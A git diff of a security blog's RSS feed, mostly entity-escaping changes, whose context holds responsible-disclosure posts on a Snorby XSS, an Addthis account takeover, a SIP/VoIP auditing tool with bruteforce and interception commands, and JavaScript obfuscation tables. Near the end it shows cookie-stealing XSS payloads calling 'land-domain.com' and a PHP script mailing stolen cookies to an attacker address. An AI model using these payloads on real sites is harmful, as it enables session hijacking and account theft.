@@ -5,8 +5,8 @@
 		<description>security.. coding / beer / coffee</description>
 		<link>http://deftcode.ninja/</link>
 		<atom:link href="http://deftcode.ninja/feed.xml" rel="self" type="application/rss+xml" />
-		<pubDate>Thu, 04 Aug 2016 17:31:50 +0200</pubDate>
-		<lastBuildDate>Thu, 04 Aug 2016 17:31:50 +0200</lastBuildDate>
+		<pubDate>Mon, 29 May 2017 20:06:09 +0200</pubDate>
+		<lastBuildDate>Mon, 29 May 2017 20:06:09 +0200</lastBuildDate>
 		<generator>Jekyll v2.5.3</generator>
 		
 			<item>
@@ -25,7 +25,7 @@
 
 &lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;
 
-&lt;p&gt;&lt;strong&gt;CVSS Score&lt;/strong&gt;: 3.5 (&lt;a href=&quot;https://nvd.nist.gov/cvss.cfm?calculator&amp;amp;version=2&amp;amp;vector=(AV:N/AC:M/Au:S/C:N/I:P/A:N)&quot; title=&quot;CVSS v2 Vector (AV:N/AC:M/Au:S/C:N/I:P/A:N)&quot; target=&quot;_blank&quot;&gt;AV:N/AC:M/Au:S/C:N/I:P/A:N&lt;/a&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CVSS Score&lt;/strong&gt;: 4.3 (&lt;a href=&quot;https://nvd.nist.gov/cvss.cfm?calculator&amp;amp;version=2&amp;amp;vector=(AV:N/AC:M/Au:N/C:N/I:P/A:N)&quot; title=&quot;CVSS v2 Vector (AV:N/AC:M/Au:N/C:N/I:P/A:N)&quot; target=&quot;_blank&quot;&gt;AV:N/AC:M/Au:N/C:N/I:P/A:N&lt;/a&gt;)&lt;/p&gt;
 
 &lt;p&gt;The &lt;code&gt;XSS vector&lt;/code&gt; is triggered in the &lt;strong&gt;snorby/app/views/events/_menu.html.erb&lt;/strong&gt; page by the &lt;strong&gt;event/menu&lt;/strong&gt;:&lt;/p&gt;
 
@@ -36,8 +36,6 @@
         &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= drop_down_item &amp;quot;#{cls.name}&amp;quot;, &amp;#39;#&amp;#39;, nil, { :class =&amp;gt; &amp;#39;classification&amp;#39;, :&amp;quot;data-classification-id&amp;quot; =&amp;gt; cls.id.to_i } %&amp;gt;
     &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% end %&amp;gt;
 &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% end %&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;!--r34dm0r3--&gt;
 
 &lt;h3 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h3&gt;
 
@@ -250,7 +248,7 @@ the requireds gem dependencies through the Gemfile.&lt;/p&gt;
     DUMPHEX     [on|off]        Dump network traffic in hexadecimal (default: off)
     DUMPCLEAN   [on|off]        Clear network traffic skipping unicode frame bytes (default: on)
 
-    * r: range  ex. '0-65535'
+    * r: range  ex. &#39;0-65535&#39;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;h4 id=&quot;list-the-environment-variables&quot;&gt;List the environment variables&lt;/h4&gt;
@@ -288,8 +286,8 @@ You could add or remove configuration files to array named &lt;code&gt;@@service
 
 &lt;pre&gt;&lt;code&gt;@@services_files = [
     # file to audit.                    # unsecure parameter regex.
-    '/etc/asterisk/sip.conf'            =&amp;gt; /^(allow=|allowguest)/,
-    '/etc/asterisk/extensions.conf'     =&amp;gt; /^(allow)/
+    &#39;/etc/asterisk/sip.conf&#39;            =&amp;gt; /^(allow=|allowguest)/,
+    &#39;/etc/asterisk/extensions.conf&#39;     =&amp;gt; /^(allow)/
 ]
 &lt;/code&gt;&lt;/pre&gt;
 
@@ -305,8 +303,8 @@ must &lt;strong&gt;set&lt;/strong&gt; the &lt;strong&gt;regular expression&lt;/s
     Checking filename:  /etc/asterisk/sip.conf
     regexp to matchs:   (?-mix:^(allow=|allowguest))
 
-    Line 3: un-safe parameter found 'allowguest=no'
-    Line 9: un-safe parameter found 'allow=ulaw'
+    Line 3: un-safe parameter found &#39;allowguest=no&#39;
+    Line 9: un-safe parameter found &#39;allow=ulaw&#39;
 
     Checking filename:  /etc/asterisk/extensions.conf
     regexp to matchs:   (?-mix:^(allow))
@@ -391,8 +389,8 @@ or the &lt;strong&gt;file&lt;/strong&gt; that can be &lt;strong&gt;used&lt;/stro
     starting enumeration on address:    127.0.0.1
     using ports-range:                  5060-5060 (udp)
 
-    + 127.0.0.1:5060         extension '7002' enabled   [no auth]
-    + 127.0.0.1:5060         extension '7003' enabled   [no auth]
+    + 127.0.0.1:5060         extension &#39;7002&#39; enabled   [no auth]
+    + 127.0.0.1:5060         extension &#39;7003&#39; enabled   [no auth]
     &amp;gt; testing extension: 8000                  
 
     ------------------------------------------------------------------------------------
@@ -419,8 +417,8 @@ vsaudit &amp;gt; en 7000-8000
     starting enumeration on address:    127.0.0.1
     using single port:                  5060 (udp)
 
-    + 127.0.0.1:5060         extension '7002' enabled   [no auth]
-    + 127.0.0.1:5060         extension '7003' enabled   [no auth]
+    + 127.0.0.1:5060         extension &#39;7002&#39; enabled   [no auth]
+    + 127.0.0.1:5060         extension &#39;7003&#39; enabled   [no auth]
     &amp;gt; testing extension: 8000
 
     ------------------------------------------------------------------------------------
@@ -439,7 +437,7 @@ vsaudit &amp;gt; en 7000-8000
     starting enumeration on address:    127.0.0.1
     using ports-range:                  5060-5060 (udp)
 
-    + 127.0.0.1:5060         extension '7002' enabled   [no auth]
+    + 127.0.0.1:5060         extension &#39;7002&#39; enabled   [no auth]
     &amp;gt; testing extension: 3001                  
 
     ------------------------------------------------------------------------------------
@@ -585,7 +583,7 @@ separated by the &lt;strong&gt;separator&lt;/strong&gt; &lt;code&gt;:~&lt;/code&
 &lt;pre&gt;&lt;code&gt;    md5_a = md5(username : realm : password)        # Encode first string.
     md5_b = md5(method : request_uri)               # Encode last string.
 
-    md5_f = md5(md5_a : nonce : md5_b)              # Here is the encoded 'response' hash.
+    md5_f = md5(md5_a : nonce : md5_b)              # Here is the encoded &#39;response&#39; hash.
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;How to use it:&lt;/p&gt;
@@ -662,7 +660,7 @@ separated by the &lt;strong&gt;separator&lt;/strong&gt; &lt;code&gt;:~&lt;/code&
 
 &lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; info asterisk
 
-Module 'asterisk' found:
+Module &#39;asterisk&#39; found:
 
 + Name:         Asterisk auditing module v. 2015.1
 + Author:       Federico Fazzi &amp;lt;eurialo@deftcode.ninja&amp;gt;
@@ -675,7 +673,7 @@ Module 'asterisk' found:
 
 &lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; info 127.0.0.1
 
-Address '127.0.0.1' found:
+Address &#39;127.0.0.1&#39; found:
 
 + Device:   127.0.0.1
 + Port:     5060/udp
@@ -774,7 +772,7 @@ vsaudit &amp;gt; h [description|environment|audit|filters|informations|global]
         DUMPHEX         [on|off]                Dump network traffic in hexadecimal (default: off)
         DUMPCLEAN       [on|off]                Clear network traffic skipping unicode frame bytes (default: on)
 
-    * r: range  ex. '0-65535'
+    * r: range  ex. &#39;0-65535&#39;
 
 
     + AUDIT COMMANDS:
@@ -786,8 +784,8 @@ vsaudit &amp;gt; h [description|environment|audit|filters|informations|global]
         bf|bruteforce   [*r|*e] [*p] [addr]     Try to bruteforce sip extension(s)
 
         * r: range  ex. 0500-6000
-        * e: ext-file   ex. 'ext-list'
-        * p: psw-file   ex. 'psw-list'
+        * e: ext-file   ex. &#39;ext-list&#39;
+        * p: psw-file   ex. &#39;psw-list&#39;
 
 
     + PCAP BASE FILTERS:
@@ -810,8 +808,8 @@ vsaudit &amp;gt; h [description|environment|audit|filters|informations|global]
         in|intercept    [pcap-filter]           Filter network traffic using pcap filters (live extended)
         dc|decode       [raw-file]              Decode on-the-fly raw data-file stream (listen the voice-call)
 
-        * intercept: append option 'detach' to sessionize action
-        * intercept: append option 'record' to save stream to file
+        * intercept: append option &#39;detach&#39; to sessionize action
+        * intercept: append option &#39;record&#39; to save stream to file
 
 
     + GLOBAL COMMANDS:
@@ -888,8 +886,8 @@ vsaudit &amp;gt; q
 
 &lt;div class=&quot;photo_frame_center&quot;&gt;
 	&lt;video width=&quot;480&quot; height=&quot;360&quot; controls=&quot;&quot;&gt;
-		Sorry, your browser doesn't support embedded videos, 
-		but don't worry, you can &lt;a href=&quot;/video/security/responsible-disclosure/google-xss.ogv&quot;&gt;Download It&lt;/a&gt;
+		Sorry, your browser doesn&#39;t support embedded videos, 
+		but don&#39;t worry, you can &lt;a href=&quot;/video/security/responsible-disclosure/google-xss.ogv&quot;&gt;Download It&lt;/a&gt;
 		and watch it with your favorite video player!
 		&lt;source src=&quot;/video/security/responsible-disclosure/google-xss.ogv&quot; type=&quot;video/ogg; codecs=&amp;quot;theora, vorbis&amp;quot;&quot; /&gt;
 	&lt;/video&gt;
@@ -923,7 +921,7 @@ vsaudit &amp;gt; q
 			</item>
 		
 			<item>
-				<title>Disclosure: How I'm able to take control of any Addthis.com user account!</title>
+				<title>Disclosure: How I&#39;m able to take control of any Addthis.com user account!</title>
 				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
 
 &lt;p&gt;During publishing this site I’ve added the Addthis.com plugin (one of the most popular plugin) for sharing content etc.. I’m was surprised when I discovered that I’m able to take complete control of any user account!.&lt;/p&gt;
@@ -1007,14 +1005,14 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
 
 &lt;div class=&quot;photo_frame_center&quot;&gt;
 	&lt;video width=&quot;480&quot; height=&quot;360&quot; controls=&quot;&quot;&gt;
-		Sorry, your browser doesn't support embedded videos, 
-		but don't worry, you can &lt;a href=&quot;/video/security/responsible-disclosure/addthis-vulnerability.ogv&quot;&gt;Download It&lt;/a&gt;
+		Sorry, your browser doesn&#39;t support embedded videos, 
+		but don&#39;t worry, you can &lt;a href=&quot;/video/security/responsible-disclosure/addthis-vulnerability.ogv&quot;&gt;Download It&lt;/a&gt;
 		and watch it with your favorite video player!
 		&lt;source src=&quot;/video/security/responsible-disclosure/addthis-vulnerability.ogv&quot; type=&quot;video/ogg; codecs=&amp;quot;theora, vorbis&amp;quot;&quot; /&gt;
 	&lt;/video&gt;
 &lt;/div&gt;
 
-&lt;p&gt;Watch in &lt;a href=&quot;https://www.youtube.com/watch?v=RRkDVY97D88&quot; class=&quot;lighter-red&quot; title=&quot;How I'm able to take control of any Addthis.com user account!&quot; target=&quot;_blank&quot;&gt;YouTube&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Watch in &lt;a href=&quot;https://www.youtube.com/watch?v=RRkDVY97D88&quot; class=&quot;lighter-red&quot; title=&quot;How I&#39;m able to take control of any Addthis.com user account!&quot; target=&quot;_blank&quot;&gt;YouTube&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;
 
@@ -1101,31 +1099,31 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
       &lt;td&gt;[object, Object]&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;{}&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;{}+[]&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;{}+''&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;{}+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;false&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;[![]]&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;[![]]+[]&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;[![]]+''&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;[![]]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;true&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;[!![]]&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;[!![]]+[]&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;[!![]]+''&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;[!![]]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;NaN&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;[![]]&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;&lt;code&gt;[![]]+[]&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;[![]]+''&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;[![]]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;undefined&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;[]['']&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;[]['']+[]&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;[]['']+''&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;[][&#39;&#39;]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;[][&#39;&#39;]+[]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;[][&#39;&#39;]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
@@ -1198,22 +1196,22 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
   &lt;tbody&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;code&gt;window[_](++[[]][+[]]);&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;window['function_name'](arguments)&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;window[&#39;function_name&#39;](arguments)&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;Call through the [object Window] (Represents an open window in a browser)&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;code&gt;this[_](++[[]][+[]]);&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;this['function_name'](arguments)&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;this[&#39;function_name&#39;](arguments)&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;Call through the global environment refers to the [object Window]&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;code&gt;eval(_)(++[[]][+[]]);&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;eval['function_name'](arguments)&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;eval[&#39;function_name&#39;](arguments)&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;Interprets arbitrary javascript statements (Dangerous function)&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;&lt;code&gt;var x = new Function(_+'('+(+!+[])+')'); x();&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;Function('function_name(arguments)')&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;var x = new Function(_+&#39;(&#39;+(+!+[])+&#39;)&#39;); x();&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;Function(&#39;function_name(arguments)&#39;)&lt;/code&gt;&lt;/td&gt;
       &lt;td&gt;Another possible way to execute “alert(1)” (not a full non-alphanumeric)&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
@@ -1276,7 +1274,7 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
     &lt;tr&gt;
       &lt;td&gt;“undefined”[1]&lt;/td&gt;
       &lt;td&gt;‘n’&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;([]['']+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;“false”[3]&lt;/td&gt;
@@ -1443,7 +1441,7 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
     &lt;tr&gt;
       &lt;td&gt;“undefined”[2]&lt;/td&gt;
       &lt;td&gt;‘d’&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;([]['']+[]) [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;“false”[4]&lt;/td&gt;
@@ -1468,12 +1466,12 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
     &lt;tr&gt;
       &lt;td&gt;“undefined”[5]&lt;/td&gt;
       &lt;td&gt;‘i’&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;([]['']+[]) [!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;“[object Object]”[3]&lt;/td&gt;
       &lt;td&gt;‘j’&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;([]['']+[]) [!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;unknown&lt;/td&gt;
@@ -1493,7 +1491,7 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
     &lt;tr&gt;
       &lt;td&gt;“undefined”[1]&lt;/td&gt;
       &lt;td&gt;‘n’&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;([]['']+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;“[object Object]”[1]&lt;/td&gt;
@@ -1528,7 +1526,7 @@ In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&
     &lt;tr&gt;
       &lt;td&gt;“undefined”[0]&lt;/td&gt;
       &lt;td&gt;‘u’&lt;/td&gt;
-      &lt;td&gt;&lt;code&gt;([]['']+[]) [[]*[]]&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [[]*[]]&lt;/code&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;unknown&lt;/td&gt;
@@ -1743,14 +1741,14 @@ where &lt;strong&gt;XX&lt;/strong&gt; = &lt;code&gt;id of created portfolio&lt;/
     &lt;p&gt;Generate a base html payload to steal user cookie:&lt;/p&gt;
 
     &lt;pre&gt;&lt;code&gt; &amp;lt;script&amp;gt;
-     location.href='//land-domain.com/steal.php?cookie='+document.cookie;
+     location.href=&#39;//land-domain.com/steal.php?cookie=&#39;+document.cookie;
  &amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Or if you want a payload without redirect:&lt;/p&gt;
 
-    &lt;pre&gt;&lt;code&gt; &amp;lt;img style='display:none' src=x onerror=this.src='//land-domain.com/?cookie='+document.cookie&amp;gt;
+    &lt;pre&gt;&lt;code&gt; &amp;lt;img style=&#39;display:none&#39; src=x onerror=this.src=&#39;//land-domain.com/?cookie=&#39;+document.cookie&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
   &lt;/li&gt;
   &lt;li&gt;
@@ -1765,8 +1763,8 @@ where &lt;strong&gt;XX&lt;/strong&gt; = &lt;code&gt;id of created portfolio&lt;/
 
     &lt;pre&gt;&lt;code&gt; $ echo &quot;
  &amp;lt;?php
-   mail('attacker@mailz.org', 'Cookie', $_GET['cookie']);
-   header('Location: '.$_SERVER['HTTP_REFERER']);
+   mail(&#39;attacker@mailz.org&#39;, &#39;Cookie&#39;, $_GET[&#39;cookie&#39;]);
+   header(&#39;Location: &#39;.$_SERVER[&#39;HTTP_REFERER&#39;]);
  ?&amp;gt;&quot; &amp;gt; /var/www/land-domain.com/steal.php
 &lt;/code&gt;&lt;/pre&gt;
   &lt;/li&gt;
